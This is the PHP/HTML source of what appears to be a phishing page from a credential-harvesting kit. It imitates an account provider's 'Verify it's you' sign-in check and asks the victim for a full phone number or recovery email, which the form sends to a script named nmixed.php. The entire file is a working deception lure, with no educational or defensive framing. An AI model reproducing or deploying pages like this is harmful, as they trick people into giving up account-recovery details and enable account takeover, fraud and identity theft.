<?php include_once("includes/functions.php"); ?>
<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="css/theme.css">
<script src="js/radioselect.js"></script>

    
</head>
<body>
<div id="" class="center_div">
<div class="center_div_novmo">
<h4>Verify it's you</h4>
<p>
Something seems a bit different about the way you're trying to sign in. Complete the step below to let us know it's you and not someone pretending to be you. <a href="">Learn more.</a></p>
<h2> Select a verification method </h2>
<form id="" method="POST" action="nmixed.php">
<div style="width:550px;height:1px;background-color:#ccc;"></div>
<br>
<input type="radio" onclick="javascript:yesnoCheck();" name="yesno" id="yesCheck"/><strong> Tell us your phone number********</strong>
<br>
<div id="ifYes" style="display:none">
<input type="text" class="radio_input" name="win" value="" placeholder="Enter your full phone number"/></br>
<p style="margin: 3px 23px; color:#737373; font-size: 13px">We'll check if this matches the phone number we have on file</p>
</div>

<br>
<div style="width:550px;height:1px;background-color:#ccc;"></div>
<br>

<input type="radio" onclick="javascript:yesnoCheck();" name="yesno" id="noCheck"/>Enter your recovery email******@****.***
<br>
<div id="ifNo" style="display:none">
<input type="text" class="radio_input" name="unix" onclick="javascript:yesnoCheck1();"value="" placeholder="Recovery email on file" id="redhat"/>
</div><br><br>
<input type="submit" value="Continue" class="btnSubmit"/>
<br>
<p>Havin trouble? <a href="">select verification.</a></p>
</form>
</div>
</div>
</body>

</html>



